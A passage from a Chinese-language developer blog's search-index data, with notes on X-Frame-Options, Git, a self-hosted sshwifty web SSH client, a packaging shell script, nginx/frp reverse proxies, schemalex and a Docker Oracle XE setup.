&lt;title&gt;test&lt;/title&gt;</span><br><span class=\"line\">     &lt;link rel=&quot;stylesheet&quot; href=&quot;http://xxxxxxxxxxxxx/reset.css&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">Hello World!!</span><br><span class=\"line\">&lt;iframe  src=&quot;http://xxxxxxxxx/&quot; width=&quot;600&quot; height=&quot;100&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">~</span><br></pre></td></tr></table></figure>\n<h3 id=\"X-Frame-Options\"><a href=\"#X-Frame-Options\" class=\"headerlink\" title=\"X-Frame-Options\"></a>X-Frame-Options</h3><p>iframe 所有 https 都能載入，不然不舊所有網站都可以任意被別的網站崁入?</p>\n<p>在 header 加 X-Frame-Options 設定<br>就可以預防倒</p>\n<p>Header always append X-Frame-Options SAMEORIGIN</p>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options\" target=\"_blank\" rel=\"noopener\">X-Frame-Options 回應標頭 - HTTP | MDN</a></p>\n","categories":["https","web"],"tags":["Web"]},{"title":"常搞錯GIT觀念(for me)","url":"/blog/2018/08/09/%E5%B8%B8%E6%90%9E%E9%8C%AFGIT%E8%A7%80%E5%BF%B5-for-me/","content":"<p>先留個常忘記GIT觀念<br>以免忘記XD</p>\n<ul>\n<li>常常最後修改檔案，做git add。但再次異動也要再做<code>git add</code>動作</li>\n<li>剛建立branch，兩個branch都在同一條上面(應該說是同一個點)</li>\n<li><code>git add</code> 要怎麼取消<br>git reset HEAD<br>OR<br>git checkout – filename</li>\n<li>git branch要怎麼修改名稱<br>git branch -m oldName newName</li>\n<li>新分之要先設好預設的remote<br>git  –set-upstream-to origin/newName<br><a href=\"https://www.jianshu.com/p/cc740394faf5\" target=\"_blank\" rel=\"noopener\">git修改分支名称 - 简书</a></li>\n<li>分支是point指標概念 (可以看上面第二點)</li>\n<li>分支刪除掉commit不會不見</li>\n<li>刪除沒有合並的分支，<code>gitk</code>commit是看不到的，但他過很久會進入git垃圾回收</li>\n<li>刪除合並的分支，<code>gitk</code>commit還是回流下來</li>\n<li>master,develop盡量用merge，一個需求開一個feature，然後完成可以與develop做合併(可參考gitflow)</li>\n<li><code>git remote</code>有點像網路上的git分支，fetch完可以在與本地做merge動作</li>\n<li>不同git來源也能加入別的git repo(git remote add xxx <a href=\"http://xxxx\" target=\"_blank\" rel=\"noopener\">http://xxxx</a>)</li>\n</ul>\n<p>不支援大小寫<br>Git 修改檔名大小寫<br>$ git config core.ignorecase false<br>$ git mv -f abc.php Abc.php<br><a href=\"https://xyz.cinc.biz/2016/01/git-rename-case-sensitive.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: Git 修改檔名大小寫</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"建置 sshwifty (Web shell) 連線工具","url":"/blog/2021/03/28/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/","content":"<p>最近有遠端需求<br>所以在找類似這個工具</p>\n<a id=\"more\"></a>\n<h2 id=\"sshwifty\"><a href=\"#sshwifty\" class=\"headerlink\" title=\"sshwifty\"></a>sshwifty</h2><p>參考網路上範例修改成 traefik </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">version: <span class=\"string\">\"2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  sshwifty_home:</span><br><span class=\"line\">    image: niruix/sshwifty</span><br><span class=\"line\"><span class=\"comment\">#    container_name: sshwifty_home</span></span><br><span class=\"line\">    environment:</span><br><span class=\"line\">      - TZ=Asia/Taipei</span><br><span class=\"line\">    expose:</span><br><span class=\"line\">      - <span class=\"string\">\"8182\"</span></span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    networks:</span><br><span class=\"line\">      - traefik_network</span><br><span class=\"line\">    labels:</span><br><span class=\"line\">      <span class=\"comment\">#- \"traefik.http.routers.sshwifty.rule=Host(`sshwifty.xxxxxxxx.org`) || PathPrefix(`/sshwifty`)\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.port=8000\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.protocol=http\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.routers.sshwifty-https.rule=Host(`sshwifty.xxxxxxxx.org`)\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.routers.sshwifty-https.tls=true\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.middlewares.sshwifty-auth.basicauth.users=user:(htppaswd encode password)\"</span> <span class=\"comment\"># 記得做密碼調整</span></span><br><span class=\"line\">      <span class=\"comment\">#- \"traefik.http.routers.sshwifty.middlewares=sshwifty-auth@docker\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.routers.sshwifty-https.middlewares=sshwifty-auth@docker\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">networks:</span><br><span class=\"line\">  traefik_network:</span><br><span class=\"line\">    external: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.hi-linux.com/posts/2389.html\" target=\"_blank\" rel=\"noopener\">分享一个超实用的 Web 版 SSH 工具 Sshwifty - 奇妙的 Linux 世界</a><br><a href=\"https://roov.org/2020/10/sshwifty-web-ssh-client/\" target=\"_blank\" rel=\"noopener\">Sshwifty 一款网页端SSH客户端程序 | reizhi</a></p>\n<h2 id=\"其他相關-web-ssh-工具\"><a href=\"#其他相關-web-ssh-工具\" class=\"headerlink\" title=\"其他相關 web ssh 工具\"></a>其他相關 web ssh 工具</h2><h3 id=\"Web-SSH-工具整理\"><a href=\"#Web-SSH-工具整理\" class=\"headerlink\" title=\"Web SSH 工具整理\"></a>Web SSH 工具整理</h3><ul>\n<li>GateOne</li>\n<li>Sshwifty</li>\n<li>wssh</li>\n<li>shellinabox</li>\n<li>web-shell</li>\n<li>qweb</li>\n</ul>\n<p><a href=\"https://blog.csdn.net/shenwansangz/article/details/52711577\" target=\"_blank\" rel=\"noopener\">开源web终端ssh解决方案_程序狗的成长之路-CSDN博客</a><br><a href=\"https://www.cnblogs.com/franknihao/p/8963634.html\" target=\"_blank\" rel=\"noopener\">【webssh】网页上的SSH终端 - K.Takanashi - 博客园</a></p>\n<p><a href=\"https://gist.github.com/vitoo/8da59382a1565282ed55e78637a6a2f5\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/vitoo/8da59382a1565282ed55e78637a6a2f5</a></p>\n","categories":["Linux"],"tags":["shell","ssh"]},{"title":"快速打包程式的腳本(shell)","url":"/blog/2019/01/05/%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%85%B3%E6%9C%AC-shell/","content":"<p>最近公司做一個專案需要手動打包程式<br>因為目前公司測試環境只有一個<br>所以那個專案放在我們公司某一個 GIT 裡面<br>所以很難做到用<code>git archive</code>打包動作…</p>\n<a id=\"more\"></a>\n<p>最近因為很急著上 code<br>卻不小心包錯(手動複製到別的資料夾)…<br><del>人會犯錯是應該的</del><br>但同一個錯誤應該是要避免的<br>所以我寫了這個 shell<br>project_path 前面路徑請注意要更改<br>pack_path 前面路徑看是否需要調整<br>window 請使用 git bash 執行，直接點兩下好像不能跑</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 快速打包程式</span></span><br><span class=\"line\"><span class=\"comment\"># project_path 前面路徑請注意要更改</span></span><br><span class=\"line\"><span class=\"comment\"># pack_path 前面路徑看是否需要調整</span></span><br><span class=\"line\"><span class=\"comment\"># window請使用git bash執行，直接點兩下好像不能跑</span></span><br><span class=\"line\">project_path=/d/GIT/專案名稱/</span><br><span class=\"line\">pack_path=/d/pack/`date +%Y%m%d`/專案名稱/</span><br><span class=\"line\"><span class=\"built_in\">echo</span> project_path</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$project_path</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> pack_path</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$pack_path</span></span><br><span class=\"line\">rm -rf <span class=\"variable\">$pack_path</span></span><br><span class=\"line\">mkdir -p <span class=\"variable\">$pack_path</span></span><br><span class=\"line\"></span><br><span class=\"line\">filelist=(</span><br><span class=\"line\"><span class=\"comment\">#請放置相對程式路徑</span></span><br><span class=\"line\">application/controllers/*.php</span><br><span class=\"line\">application/controllers/A/ABC.php</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;filelist[@]&#125;</span>;<span class=\"keyword\">do</span></span><br><span class=\"line\">mkdir -p `dirname <span class=\"variable\">$pack_path</span><span class=\"variable\">$file</span>`</span><br><span class=\"line\">dir=(`dirname <span class=\"variable\">$pack_path</span><span class=\"variable\">$file</span>`)</span><br><span class=\"line\"><span class=\"comment\"># echo cp $project_path$file $&#123;dir[0]&#125;</span></span><br><span class=\"line\">cp -f <span class=\"variable\">$project_path</span><span class=\"variable\">$file</span> <span class=\"variable\">$&#123;dir[0]&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>其實我也不太會寫 shell<br>這個只是簡單的應用<br>我只 Google 一下 shell 怎麼寫 Array 跟抓檔案目前資料夾路徑(dirname)<br>在簡單用 mkdir, cp 就做出來這個東西<br>從此打包程式不手殘</p>\n","categories":["shell"],"tags":["shell","打包程式"]},{"title":"快速搭建 web 反向代理 server","url":"/blog/2020/11/24/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server/","content":"<p>之前有聽過 apache, nginx, frp, caddy server 都能做 web 反向代理<br>但都沒有實際工作用到<br>最近因為有搭建 mockapi 和 jboss 想對外測試line webhook<br>有想到代理對外窗口使用 ngrok<br>但…反向代理花了不少時間<br>希望下次複製及所用<br>這邊應該會以window 環境<br>畢竟公司開發環境是 window</p>\n<a id=\"more\"></a>\n<p>之前有設定過 caddy server 1.0<br>反向代理非常好設定<br>但是從 caddy server 2.0 設定檔完全不會設定<br>然後 http =&gt; https 強制<br>相關都關不掉，找不到取消方法<br>只能乖乖用回其他工具</p>\n<h2 id=\"nginx-方便好設定\"><a href=\"#nginx-方便好設定\" class=\"headerlink\" title=\"nginx(方便好設定)\"></a>nginx(方便好設定)</h2><h3 id=\"nginx-window\"><a href=\"#nginx-window\" class=\"headerlink\" title=\"nginx (window)\"></a>nginx (window)</h3><p>nginx 有 window 免安裝 zip</p>\n<figure class=\"highlight bat\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 啟動 nginx</span><br><span class=\"line\"><span class=\"built_in\">start</span> nginx</span><br><span class=\"line\"># 關閉 nginx</span><br><span class=\"line\"> ./nginx.exe -s stop</span><br></pre></td></tr></table></figure>\n<h3 id=\"反向代理設定\"><a href=\"#反向代理設定\" class=\"headerlink\" title=\"反向代理設定\"></a>反向代理設定</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">server&#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    # server_name 沒設定localhost 的話，只有 127.0.0.1 連的到</span><br><span class=\"line\">    server_name localhost;</span><br><span class=\"line\">    location /mockapi/ &#123;</span><br><span class=\"line\">       </span><br><span class=\"line\">        # 後端的 Web Server, 即真實伺服器:</span><br><span class=\"line\">        proxy_pass http://127.0.0.1:8081/;</span><br><span class=\"line\"> </span><br><span class=\"line\">        # 定義 header 變數, 記錄使用者的 IP</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        </span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\"> </span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;</span><br><span class=\"line\">        proxy_max_temp_file_size 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location /web/ &#123;</span><br><span class=\"line\">       </span><br><span class=\"line\">        # 後端的 Web Server, 即真實伺服器:</span><br><span class=\"line\">        proxy_pass http://127.0.0.1:8080/;</span><br><span class=\"line\"> </span><br><span class=\"line\">        # 定義 header 變數, 記錄使用者的 IP</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        </span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\"> </span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;</span><br><span class=\"line\">        proxy_max_temp_file_size 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://www.cnblogs.com/woshimrf/p/nginx-proxy-rewrite-url.html\" target=\"_blank\" rel=\"noopener\">Nginx代理proxy pass配置去除前缀 - Ryan.Miao - 博客园</a></p>\n<h3 id=\"其他反向代理設定\"><a href=\"#其他反向代理設定\" class=\"headerlink\" title=\"其他反向代理設定\"></a>其他反向代理設定</h3><p>location 要包在 server 裡面</p>\n<p>/mockapi/ ==&gt; 127.0.0.1:8081<br>/web/ ==&gt; 127.0.0.1:8080</p>\n<p>相對要連到<br>test.com/app/xxxxx =&gt;  <a href=\"http://192.168.154.102/maped_dir/xxxxx\" target=\"_blank\" rel=\"noopener\">http://192.168.154.102/maped_dir/xxxxx</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">location /app/ &#123;</span><br><span class=\"line\">    proxy_pass      http://192.168.154.102/maped_dir/;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>非常簡單</p>\n<p>test.com/app/8081 =&gt; <a href=\"http://192.168.154.102:8081\" target=\"_blank\" rel=\"noopener\">http://192.168.154.102:8081</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">location ~ ^/app/(.*)$ &#123;</span><br><span class=\"line\">    proxy_pass       http://192.169.154.102:$1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>test.com/app/request/xxxxx =&gt; <a href=\"http://192.168.154.102:9999/some_dir/xxxxx\" target=\"_blank\" rel=\"noopener\">http://192.168.154.102:9999/some_dir/xxxxx</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">location ~ ^/app/(.*)$ &#123;</span><br><span class=\"line\">    proxy_pass       http://192.169.154.102:9999/some_dir/$1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>/app/hit/some/request/?name=xxxxx</p>\n<p>=&gt; <a href=\"http://192.168.154.102:9999/hit_page.php?path=some/request/&amp;name=xxxxx\" target=\"_blank\" rel=\"noopener\">http://192.168.154.102:9999/hit_page.php?path=some/request/&amp;name=xxxxx</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">location  /app/ &#123;</span><br><span class=\"line\">    rewrite    ^/app/hit/(.*)$ /hit_page.php?path=$1 break;</span><br><span class=\"line\">    proxy_pass   http://192.168.154.102:9999/some_dir/;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>參考<a href=\"https://www.liaohuqiu.net/posts/nginx-proxy-pass/\" target=\"_blank\" rel=\"noopener\">Nginx proxy_pass: examples for how does nginx proxy_pass map the request | Yet Another Summer Rain</a></p>\n<h2 id=\"frp\"><a href=\"#frp\" class=\"headerlink\" title=\"frp\"></a>frp</h2><p>之前有有紀錄 <a href=\"https://malagege.github.io/blog/2020/11/15/frp-%E5%85%A7%E7%B6%B2%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/\">frp 內網穿透使用筆記 | 程式狂想筆記</a><br>custom_domains、vhost_http_port 都需要設定</p>\n<p>custom_domains 就設定 IP 就可以了<br>參考:<a href=\"https://www.cnblogs.com/sanduzxcvbnm/p/8509150.html\" target=\"_blank\" rel=\"noopener\">七、利用frp 穿透到内网的http/https网站，实现对外开放 - 三度 - 博客园</a></p>\n<h3 id=\"frps\"><a href=\"#frps\" class=\"headerlink\" title=\"frps\"></a>frps</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7000</span><br><span class=\"line\">vhost_http_port = 80</span><br></pre></td></tr></table></figure>\n<h3 id=\"frpc\"><a href=\"#frpc\" class=\"headerlink\" title=\"frpc\"></a>frpc</h3><figure class=\"highlight ini\"><figcaption><span>frpc.ini</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">server_addr</span> = <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span></span><br><span class=\"line\"><span class=\"attr\">server_port</span> = <span class=\"number\">7000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[web01]</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = http</span><br><span class=\"line\"><span class=\"attr\">local_port</span> = <span class=\"number\">8080</span></span><br><span class=\"line\"><span class=\"attr\">custom_domains</span> = <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span></span><br><span class=\"line\"><span class=\"attr\">locations</span> = /web</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[web02]</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = http</span><br><span class=\"line\"><span class=\"attr\">local_port</span> = <span class=\"number\">8081</span></span><br><span class=\"line\"><span class=\"attr\">custom_domains</span> = <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span></span><br><span class=\"line\"><span class=\"attr\">locations</span> = /mockapi</span><br></pre></td></tr></table></figure>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>caddy server<br>traefik 在想看看有空研究</p>\n","categories":["Linux"],"tags":["proxy"]},{"title":"快速產生資料表 alter table 語法 schemalex","url":"/blog/2020/01/02/%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E8%B3%87%E6%96%99%E8%A1%A8-alter-table-%E8%AA%9E%E6%B3%95-schemalex/","content":"<p>常常我們在測試 DB 環境<br>不會馬上上到正式環境<br>但都是分開改 alter table<br>之前有在 Dbeaver 有 migrate table 功能<br>但大致上我們工程師沒有 DB 的權限<br>要如何快速產生 alter table 語法呢?</p>\n<a id=\"more\"></a>\n<p>其實之前有寫過 <a href=\"https://malagege.github.io/blog/2019/09/12/MySQL-%E6%AF%94%E8%BC%83%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E5%BA%AB%E6%96%B9%E6%B3%95/\">MySQL 比較兩個資料庫方法 | 程式狂想筆記</a><br>但一樣沒有產生 alter table sql 語法…<br>裡面的範例也沒有使用過<br>今天我發現 github 裡面有一個 schemalex<br>可以輕鬆產生 alter table 語法</p>\n<h2 id=\"schemalex\"><a href=\"#schemalex\" class=\"headerlink\" title=\"schemalex\"></a>schemalex</h2><p><a href=\"https://github.com/schemalex/schemalex\" target=\"_blank\" rel=\"noopener\">schemalex/schemalex: Generate difference sql of two mysql schema</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- old.sql</span></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> hoge (</span><br><span class=\"line\">    <span class=\"keyword\">id</span> <span class=\"built_in\">INTEGER</span> <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> AUTO_INCREMENT,</span><br><span class=\"line\">    PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"keyword\">id</span>)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- new.sql</span></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> hoge (</span><br><span class=\"line\">    <span class=\"keyword\">id</span> <span class=\"built_in\">INTEGER</span> <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> AUTO_INCREMENT,</span><br><span class=\"line\">    c <span class=\"built_in\">VARCHAR</span> (<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">\"hoge\"</span>,</span><br><span class=\"line\">    PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"keyword\">id</span>)</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> fuga (</span><br><span class=\"line\">    <span class=\"keyword\">id</span> <span class=\"built_in\">INTEGER</span> <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> AUTO_INCREMENT,</span><br><span class=\"line\">    PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"keyword\">id</span>)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>schemalex old.sql new.sql</p>\n<p>就會印出 Alter table SQL</p>\n<p>好處只要用phpmyadmin 匯出 create table 就可以完成!!<br>更多用法可以參考官網文件<a href=\"https://github.com/schemalex/schemalex\" target=\"_blank\" rel=\"noopener\">schemalex/schemalex: Generate difference sql of two mysql schema</a></p>\n<h2 id=\"快速產生-create-sql-語法\"><a href=\"#快速產生-create-sql-語法\" class=\"headerlink\" title=\"快速產生 create sql 語法\"></a>快速產生 create sql 語法</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SHOW CREATE TABLE tbl_name</span><br></pre></td></tr></table></figure>\n<p>相關查詢資料:<br><a href=\"https://dev.mysql.com/doc/refman/8.0/en/show-create-table.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 13.7.7.10 SHOW CREATE TABLE Statement</a><br><a href=\"https://wapa5pow.com/compare-golang-database-libraries/#k0kubunsqldef\" target=\"_blank\" rel=\"noopener\">Go言語のデータベース用のライブラリを比較する - Koichi Ishida blog</a><br><a href=\"https://github.com/schemalex/git-schemalex\" target=\"_blank\" rel=\"noopener\">schemalex/git-schemalex: database migration tool for mysql schema is managed via git</a><br><a href=\"https://github.com/k0kubun/sqldef\" target=\"_blank\" rel=\"noopener\">k0kubun/sqldef: Idempotent MySQL/PostgreSQL schema management by SQL</a><br><a href=\"https://github.com/rubenv/sql-migrate\" target=\"_blank\" rel=\"noopener\">rubenv/sql-migrate: SQL schema migration tool for Go.</a><br><a href=\"https://blog.yowko.com/sql-server-schema-compare/\" target=\"_blank\" rel=\"noopener\">如何快速比對資料庫結構差異並產生同步指令 - Yowko’s Notes</a><br><a href=\"https://www.schemacrawler.com/\" target=\"_blank\" rel=\"noopener\">SchemaCrawler - Free database schema discovery and comprehension tool</a></p>\n","categories":["實用工具"],"tags":["sql"]},{"title":"快速用 docker 建置 oracle 環境方法","url":"/blog/2020/03/07/%E5%BF%AB%E9%80%9F%E7%94%A8-docker-%E5%BB%BA%E7%BD%AE-oracle-%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/","content":"<p>最近要看 DB 工具是否能正常連 Oracle<br>簡單使用 Docker 來架設環境</p>\n<a id=\"more\"></a>\n<p><a href=\"https://github.com/componhead/docker-oracle-xe-11g\" target=\"_blank\" rel=\"noopener\">componhead/docker-oracle-xe-11g: My oracle xe 11g</a><br>build 上面這版<code>docker build . -t oracle-xe-11g</code></p>\n<p>帳號密碼 system,oracle<br>這樣就能進去了</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">'2'</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  oracle:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">oracle-xe-11g</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span>   <span class=\"comment\">#如果docker容器由于一些问题挂掉的化，docker-composer会自动把容器给启动起来</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">1521</span><span class=\"string\">:1521</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"number\">8080</span><span class=\"string\">:8080</span></span><br></pre></td></tr></table></figure>\n<p>docker-compose up -d 就可以執行環境，但要等一下時間</p>\n<p>docker-compose logs -f 看到最後一段就可以使用了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">oracle_1  | ls: cannot access /u01/app/oracle/oradata: No such file or directory</span><br><span class=\"line\">oracle_1  | Database not initialized. Initializing database.</span><br><span class=\"line\">oracle_1  | Setting up:</span><br><span class=\"line\">oracle_1  | processes=500</span><br><span class=\"line\">oracle_1  | sessions=555</span><br><span class=\"line\">oracle_1  | transactions=610</span><br><span class=\"line\">oracle_1  | If you want to use different parameters set processes, sessions, transactions env variables and consider this formula:</span><br><span class=\"line\">oracle_1  | processes=x</span><br><span class=\"line\">oracle_1  | sessions=x*1.1+5</span><br><span class=\"line\">oracle_1  | transactions=sessions*1.1</span><br><span class=\"line\">oracle_1  | </span><br><span class=\"line\">oracle_1  | Oracle Database 11g Express Edition Configuration</span><br><span class=\"line\">oracle_1  | -------------------------------------------------</span><br><span class=\"line\">oracle_1  | This will configure on-boot properties of Oracle Database 11g Express </span><br><span class=\"line\">oracle_1  | Edition.  The following questions will determine whether the database should </span><br><span class=\"line\">oracle_1  | be starting upon system boot, the ports it will use, and the passwords that </span><br><span class=\"line\">oracle_1  | will be used for database accounts.  Press &lt;Enter&gt; to accept the defaults. </span><br><span class=\"line\">oracle_1  | Ctrl-C will abort.</span><br><span class=\"line\">oracle_1  | </span><br><span class=\"line\">oracle_1  | Specify the HTTP port that will be used for Oracle Application Express [8080]:</span><br><span class=\"line\">oracle_1  | Specify a port that will be used for the database listener [1521]:</span><br><span class=\"line\">oracle_1  | Specify a password to be used for database accounts.  Note that the same</span><br><span class=\"line\">oracle_1  | password will be used for SYS and SYSTEM.  Oracle recommends the use of </span><br><span class=\"line\">oracle_1  | different passwords for each database account.  This can be done after </span><br><span class=\"line\">oracle_1  | initial configuration:</span><br><span class=\"line\">oracle_1  | Confirm the password:</span><br><span class=\"line\">oracle_1  | </span><br><span class=\"line\">oracle_1  | Do you want Oracle Database 11g Express Edition to be started on boot (y/n) [y]:</span><br><span class=\"line\">oracle_1  | Starting Oracle Net Listener...Done</span><br><span class=\"line\">oracle_1  | Configuring database...Done</span><br><span class=\"line\">oracle_1  | Starting Oracle Database 11g Express Edition instance...Done</span><br><span class=\"line\">oracle_1  | Installation completed successfully.</span><br><span class=\"line\">oracle_1  | Database initialized. Please visit http://#containeer:8080/apex to proceed with configuration</span><br><span class=\"line\">oracle_1  | Oracle Database 11g Express Edition instance is already started</span><br><span class=\"line\">oracle_1  | </span><br><span class=\"line\">oracle_1  | Starting import from &apos;/docker-entrypoint-initdb.d&apos;:</span><br><span class=\"line\">oracle_1  | found file /docker-entrypoint-initdb.d//docker-entrypoint-initdb.d/*</span><br><span class=\"line\">oracle_1  | [IMPORT] /entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*</span><br><span class=\"line\">oracle_1  | </span><br><span class=\"line\">oracle_1  | Import finished</span><br><span class=\"line\">oracle_1  | </span><br><span class=\"line\">oracle_1  | Database ready to use. Enjoy! ;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"其他可參考設定\"><a href=\"#其他可參考設定\" class=\"headerlink\" title=\"其他可參考設定\"></a>其他可參考設定</h2><p><a href=\"https://www.cnblogs.com/Jin520304/p/7884441.html\" target=\"_blank\" rel=\"noopener\">docker安装wnameless/oracle-xe-11g并运行（手写超详细） - 哈喽，小枫 - 博客园</a><br><a href=\"https://zoctan.github.io/2018/05/21/%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B/%E4%BD%BF%E7%94%A8%20Docker%20Oracle/\" target=\"_blank\" rel=\"noopener\">使用 Docker Oracle | Zoctan’s Blog</a></p>\n<p><a href=\"https://hub.docker.com/r/acktsw/oracle-xe-11g/dockerfile\" target=\"_blank\" rel=\"noopener\">acktsw/oracle-xe-11g Dockerfile - Docker Hub</a><br>這個不知道為什麼帳號密碼無法登入，不過 ssh server 設定可以當參考</p>\n<p><a href=\"https://blog.csdn.net/qq_38270106/article/details/83271284\" target=\"_blank\" rel=\"noopener\">docker compose安装oracle_数据库_落叶飘零z的博客-CSDN博客</a></p>\n<h2 id=\"新增資料表前置作業\"><a href=\"#新增資料表前置作業\" class=\"headerlink\" title=\"新增資料表前置作業\"></a>新增資料表前置作業</h2><p>其實上面安裝好，不能馬上建制資料表<br>後來查了一下，要用新增使用者帳號去做</p>\n<p>SID 沒有找到修改的方法</p>\n<blockquote>\n<p>XE版本裡只能有一個instance， 我將SID修改了以後貌似會報錯，所以SID就不用修改了。<br>BASE和HOME兩個變量後儘量不要加斜線 ‘/‘ ,有可能會報錯，雖然不知到為什麼… 同時，TNS_ADMIN這個變量一定要有。<br>參考<a href=\"https://blog.csdn.net/u013569416/article/details/41895389\" target=\"_blank\" rel=\"noopener\">Linux下安裝Oracle Database 11g Express Edition_Perserve In 